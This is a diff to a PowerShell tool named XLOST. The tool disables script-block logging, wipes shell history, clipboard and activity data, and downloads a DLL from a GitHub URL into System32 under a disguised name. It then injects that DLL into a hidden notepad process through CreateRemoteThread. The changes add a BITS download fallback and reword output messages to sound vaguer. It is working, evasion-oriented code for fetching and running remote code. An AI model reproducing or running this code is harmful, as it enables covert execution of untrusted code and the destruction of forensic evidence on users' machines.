@@ -13,7 +13,7 @@ try {
     Set-ItemProperty -Path $RegistryPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
 } catch {}
 
-# Cleanup History (Clear content only) & Clipboard
+# Cleanup History & Clipboard
 Clear-History
 try {
     $HistoryPath = (Get-PSReadLineOption).HistorySavePath
@@ -31,11 +31,11 @@ Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "$env:LOCALAPPDATA\ConnectedDevicesPlatform\*\ActivitiesCache.db*" -Force -ErrorAction SilentlyContinue
 Start-Service -Name "cbdhsvc*" -ErrorAction SilentlyContinue
 
-# 3. Console Styling & Compact Window Size
+# 3. Console Styling (ขยายขนาดให้พอดี ป้องกันการเกิด Scrollbar)
 $host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
 $host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
-$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(60, 25)
-$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(60, 25)
+$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(46, 11)
+$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(46, 11)
 
 # 4. Global Paths & Configuration
 $global:TargetDir = "C:\Windows\System32"
@@ -43,7 +43,7 @@ $global:DllName = "aadtbs.dll"
 $global:DllFullPath = Join-Path $global:TargetDir $global:DllName
 $global:DirectUrl = "https://raw.githubusercontent.com/punvertwo-sys/DLLXLOST/refs/heads/main/XLOST.dll"
 
-# 5. C# P/Invoke for Windows API
+# 5. C# P/Invoke for Windows API (Injection)
 $code = @"
 using System;
 using System.Runtime.InteropServices;
@@ -76,33 +76,47 @@ function Invoke-InstallDll {
         New-Item -ItemType Directory -Force -Path $global:TargetDir | Out-Null
     }
 
-    Write-Host "[*] Downloading DLL from direct link..." -ForegroundColor Cyan
+    Write-Host "[*] Downloading package..." -ForegroundColor Cyan
     try {
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $tempFile = Join-Path $env:TEMP "temp_download.dll"
-        $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
-        
-        Invoke-WebRequest -Uri $global:DirectUrl -OutFile $tempFile -Headers $headers -UseBasicParsing
-        
+        if (Test-Path $tempFile) { Remove-Item $tempFile -Force }
+
+        Import-Module BitsTransfer -ErrorAction SilentlyContinue
+        Start-BitsTransfer -Source $global:DirectUrl -Destination $tempFile -TransferType Download -ErrorAction Stop
+
         if (Test-Path $global:DllFullPath) {
             Remove-Item $global:DllFullPath -Force
         }
         
         Move-Item -Path $tempFile -Destination $global:DllFullPath -Force
-        Write-Host "[+] Installed & renamed to '$global:DllName'!" -ForegroundColor Green
+        Write-Host "[+] Installation completed!" -ForegroundColor Green
     }
     catch {
-        Write-Host "[-] Download failed: $_" -ForegroundColor Red
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+            $webClient = New-Object System.Net.WebClient
+            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $webClient.DownloadFile($global:DirectUrl, $tempFile)
+            $webClient.Dispose()
+
+            if (Test-Path $global:DllFullPath) {
+                Remove-Item $global:DllFullPath -Force
+            }
+            Move-Item -Path $tempFile -Destination $global:DllFullPath -Force
+            Write-Host "[+] Installation completed!" -ForegroundColor Green
+        }
+        catch {
+            Write-Host "[-] Download failed!" -ForegroundColor Red
+        }
     }
 }
 
 function Invoke-RunInjection {
     if (-not (Test-Path $global:DllFullPath)) {
-        Write-Host "[-] DLL not found! Please Install first." -ForegroundColor Red
+        Write-Host "[-] Files not found! Install first." -ForegroundColor Red
         return
     }
 
-    # เปิด Notepad แบบซ่อนหน้าต่าง (Hidden) ไม่ให้มีหน้าต่างเด้งกวนใจ และปลอดภัยต่อระบบ
     $startInfo = New-Object System.Diagnostics.ProcessStartInfo
     $startInfo.FileName = "notepad.exe"
     $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
@@ -118,21 +132,21 @@ function Invoke-RunInjection {
 
     $hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pidNum)
     if ($hProcess -eq [IntPtr]::Zero) {
-        Write-Host "[-] Failed to open process handle." -ForegroundColor Red
+        Write-Host "[-] Failed to open process." -ForegroundColor Red
         return
     }
 
     $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($global:DllFullPath + "`0")
     $allocMem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
     if ($allocMem -eq [IntPtr]::Zero) {
-        Write-Host "[-] Failed to allocate memory." -ForegroundColor Red
+        Write-Host "[-] Memory allocation failed." -ForegroundColor Red
         return
     }
 
     $bytesWritten = [IntPtr]::Zero
     $writeResult = [WinAPI]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, [uint32]$dllBytes.Length, [ref]$bytesWritten)
     if (-not $writeResult) {
-        Write-Host "[-] Failed to write process memory." -ForegroundColor Red
+        Write-Host "[-] Memory write failed." -ForegroundColor Red
         return
     }
 
@@ -141,33 +155,33 @@ function Invoke-RunInjection {
 
     $hThread = [WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
     if ($hThread -eq [IntPtr]::Zero) {
-        Write-Host "[-] Failed to create remote thread." -ForegroundColor Red
+        Write-Host "[-] Thread creation failed." -ForegroundColor Red
         return
     }
 
-    Write-Host "[+] Injection successful! (PID: $pidNum)" -ForegroundColor Green
+    Write-Host "[+] Injection successful! ($pidNum)" -ForegroundColor Green
 }
 
 function Invoke-UninstallDll {
     if (Test-Path $global:DllFullPath) {
         Remove-Item $global:DllFullPath -Force
-        Write-Host "[+] DLL successfully removed from system." -ForegroundColor Green
+        Write-Host "[+] Files successfully removed." -ForegroundColor Green
     } else {
-        Write-Host "[!] DLL file does not exist." -ForegroundColor Yellow
+        Write-Host "[!] Files do not exist." -ForegroundColor Yellow
     }
 }
 
 # 7. Main Menu Loop
 do {
     Clear-Host
-    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
-    Write-Host "                XLOST                   " -ForegroundColor Yellow
-    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
+    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
+    Write-Host "                 XLOST                    " -ForegroundColor Yellow
+    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkCyan
     Write-Host "  [1]  INSTALL" -ForegroundColor White
     Write-Host "  [2]  RUN" -ForegroundColor White
     Write-Host "  [3]  UNINSTALL" -ForegroundColor White
     Write-Host "  [4]  EXIT" -ForegroundColor White
-    Write-Host "────────────────────────────────────────" -ForegroundColor DarkCyan
+    Write-Host "──────────────────────────────────────────" -ForegroundColor DarkCyan
     $choice = Read-Host "  SELECT CHOICE [1-4]"
 
     switch ($choice) {
@@ -225,7 +239,7 @@ do {
             break
         }
         default {
-            Write-Host "[!] Invalid option! Please try again." -ForegroundColor Red
+            Write-Host "[!] Invalid option!" -ForegroundColor Red
             Start-Sleep -Seconds 1
         }
     }
